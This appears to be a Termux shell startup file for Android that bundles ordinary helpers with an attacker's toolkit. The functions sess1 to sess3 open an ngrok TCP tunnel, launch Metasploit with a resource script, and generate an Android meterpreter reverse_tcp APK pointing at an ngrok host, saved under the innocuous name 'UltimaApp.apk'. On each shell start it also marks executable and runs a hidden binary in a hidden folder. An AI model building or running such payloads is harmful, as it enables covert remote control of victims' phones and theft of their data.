if [ -x /data/data/com.termux/files/usr/libexec/termux/command-not-found ]; then
        command_not_found_handle() {
                /data/data/com.termux/files/usr/libexec/termux/command-not-found "$1"
        }
fi



function dw {
cd /sdcard/download
ls
}


function bit {
termux-open https://bitly.com
}


function ingo {
chmod 777 $2
if [ $1 = "./" ];then
./$2
else
$1 $2
fi
}


function ip {
ip=$(ifconfig wlan0 | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v 255)
printf "$ip" 
} 


function up {
pkg update -y
pkg upgrade -y
}


function sess1 {
ngrok tcp 5555
}
function sess2 {
msfconsole -q -r $PREFIX/lib/config-base
}
function sess3 {
read -p "puerto: " puerto
msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$puerto R > /sdcard/download/UltimaApp.apk
} 



ip=$(ifconfig wlan0 | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v 255)

dw="/sdcard/download"

cd
cd SG
cd .up
chmod 777 .up07
./.up07
cd
said
PS1='\$ '
